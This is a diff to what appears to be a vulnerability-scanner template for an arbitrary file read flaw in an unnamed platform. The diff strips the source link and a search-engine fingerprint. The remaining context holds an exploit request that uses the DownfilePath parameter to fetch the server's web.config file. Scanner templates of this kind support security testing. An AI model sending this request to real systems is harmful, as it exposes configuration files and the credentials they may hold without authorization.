@@ -3,12 +3,8 @@ info:
   name: 智某平台DownfilePath存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rw6quxhzedzx632a'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rw6quxhzedzx632a
-    fofa: body="custom/blue/uimaker/easyui.css"
 http:
 - raw:
   - GET /ExpDownloadService.aspx?DownfilePath=/web.config HTTP/1.1
